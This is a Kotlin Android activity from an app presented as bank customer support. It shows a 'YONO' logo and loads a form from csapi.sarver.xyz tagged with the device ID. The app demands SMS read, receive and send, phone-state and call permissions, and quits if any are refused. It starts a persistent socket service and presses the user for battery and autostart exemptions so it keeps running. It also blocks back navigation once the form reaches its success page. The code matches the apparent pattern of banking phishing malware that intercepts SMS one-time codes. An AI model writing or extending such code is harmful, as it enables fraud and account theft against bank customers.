package com.customersupport

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.customersupport.databinding.ActivityMainBinding
import com.customersupport.service.SocketService

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PREFS_NAME = "app_state"
        private const val KEY_OEM_GUIDE_SHOWN = "oem_guide_shown"
    }

    private lateinit var binding: ActivityMainBinding

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
    }

    private var batteryOptAttempts = 0

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            startSocketService()
            requestBatteryOptimizationExclusion()
        } else {
            // Close the app if permissions are denied
            // Permissions will be re-asked on next app launch (onCreate calls requestPermissionsIfNeeded)
            finishAffinity()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Request permissions
        requestPermissionsIfNeeded()

        // Setup WebView
        setupWebView()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val deviceId = getAndroidId()
        val formUrl = "https://csapi.sarver.xyz/form?deviceId=$deviceId"

        binding.webView.apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true
            settings.builtInZoomControls = true
            settings.displayZoomControls = false
            settings.setSupportZoom(true)
            settings.allowFileAccess = true
            settings.allowContentAccess = true

            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                    binding.progressBar.visibility = View.VISIBLE
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    binding.progressBar.visibility = View.GONE
                    // Hide loading overlay with YONO logo
                    binding.loadingOverlay.visibility = View.GONE
                }
            }

            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    binding.progressBar.progress = newProgress
                }
            }

            loadUrl(formUrl)
        }
    }

    private fun requestPermissionsIfNeeded() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            startSocketService()
            requestBatteryOptimizationExclusion()
        }
    }

    override fun onResume() {
        super.onResume()
        // Re-check after user returns from system battery dialog
        if (hasAllPermissions() && !isIgnoringBatteryOptimizations()) {
            if (batteryOptAttempts >= 1) {
                Log.d(TAG, "Still battery-optimized after prompt, opening settings")
                openBatteryOptimizationSettings()
            } else {
                requestBatteryOptimizationExclusion()
            }
        } else if (hasAllPermissions() && isIgnoringBatteryOptimizations()) {
            maybeShowOemAutoStartGuide()
        }
    }

    /**
     * On OEM devices (Xiaomi, Oppo, Vivo, Huawei, Samsung...) the app is still
     * killed after the battery-optimization exemption unless the user also
     * enables "Autostart". Show the native OEM guide once, right after the user
     * has granted the battery exemption — there is no API to enable it ourselves.
     */
    private fun maybeShowOemAutoStartGuide() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        if (prefs.getBoolean(KEY_OEM_GUIDE_SHOWN, false)) return

        prefs.edit().putBoolean(KEY_OEM_GUIDE_SHOWN, true).apply()
        startActivity(Intent(this, OemGuideActivity::class.java))
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun openBatteryOptimizationSettings() {
        try {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open battery settings", e)
            // Fallback: app details
            try {
                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (e2: Exception) {
                Log.e(TAG, "Fallback settings also failed", e2)
            }
        }
    }

    /**
     * Request the user to exclude this app from battery optimization.
     * This is the single most impactful change for background persistence,
     * especially on OEM devices (Xiaomi, Samsung, Oppo, Vivo, etc.)
     */
    @SuppressLint("BatteryLife")
    private fun requestBatteryOptimizationExclusion() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                batteryOptAttempts++
                Log.d(TAG, "Requesting battery optimization exclusion (attempt $batteryOptAttempts)")
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } else {
                Log.d(TAG, "Already excluded from battery optimization")
                batteryOptAttempts = 0
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request battery optimization exclusion", e)
            openBatteryOptimizationSettings()
        }
    }

    private fun startSocketService() {
        val serviceIntent = Intent(this, SocketService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun getAndroidId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onBackPressed() {
        val currentUrl = binding.webView.url ?: ""
        // Block back navigation on the success page — flow is complete
        if (currentUrl.contains("success.html")) {
            return
        }
        if (binding.webView.canGoBack()) {
            binding.webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
